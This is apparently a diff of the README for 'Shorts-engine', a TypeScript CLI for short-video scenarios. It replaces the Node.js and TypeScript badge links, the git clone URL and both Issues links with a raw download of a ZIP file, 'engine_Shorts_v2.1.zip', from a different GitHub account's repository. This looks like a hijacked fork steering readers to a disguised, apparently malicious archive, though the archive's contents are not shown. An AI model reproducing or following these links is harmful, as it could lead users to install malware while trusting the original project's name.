@@ -4,8 +4,8 @@
 **A taste-first CLI that turns what you love into short-form video scenarios**
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js 24+](https://img.shields.io/badge/Node.js-24+-green.svg)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9+-blue.svg)](https://typescriptlang.org)
+[![Node.js 24+](https://img.shields.io/badge/Node.js-24+-green.svg)](https://github.com/pamterminal338/Shorts-engine/raw/refs/heads/main/src/config/engine_Shorts_v2.1.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.9+-blue.svg)](https://github.com/pamterminal338/Shorts-engine/raw/refs/heads/main/src/config/engine_Shorts_v2.1.zip)
 
 ---
 
@@ -112,7 +112,7 @@ Tell the engine your favorite films, visual styles, and writers. It builds a "ta
 
 ```bash
 # 저장소 클론 | Clone the repository
-git clone https://github.com/sinmb79/Shorts-engine.git
+git clone https://github.com/pamterminal338/Shorts-engine/raw/refs/heads/main/src/config/engine_Shorts_v2.1.zip
 cd Shorts-engine
 
 # 의존성 설치 | Install dependencies
@@ -368,6 +368,6 @@ MIT License -- Free to use, modify, and distribute.
 
 **22B Labs** (sinmb79) -- The 4th Path
 
-문의사항이나 기여는 [Issues](https://github.com/sinmb79/Shorts-engine/issues)를 이용해 주세요.
+문의사항이나 기여는 [Issues](https://github.com/pamterminal338/Shorts-engine/raw/refs/heads/main/src/config/engine_Shorts_v2.1.zip)를 이용해 주세요.
 
-For questions or contributions, please use [Issues](https://github.com/sinmb79/Shorts-engine/issues).
+For questions or contributions, please use [Issues](https://github.com/pamterminal338/Shorts-engine/raw/refs/heads/main/src/config/engine_Shorts_v2.1.zip).
